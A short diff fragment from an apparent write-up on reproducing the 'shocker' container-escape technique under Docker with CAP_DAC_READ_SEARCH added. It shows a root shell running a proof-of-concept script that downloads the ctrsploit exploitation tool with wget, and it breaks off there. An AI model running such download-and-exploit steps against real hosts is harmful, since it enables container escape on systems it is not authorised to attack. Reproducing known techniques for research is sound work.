@@ -9,6 +9,8 @@
 
 ## reproduce
 
+There's no shocker vulnerability in docker v26.1.4 , but we can use shocker as an exploit technique when use `--cap-add CAP_DAC_READ_SEARCH`
+
 ```shell
 root@localhost:~# ./poc.sh 
 + wget -q https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O ctrsploit
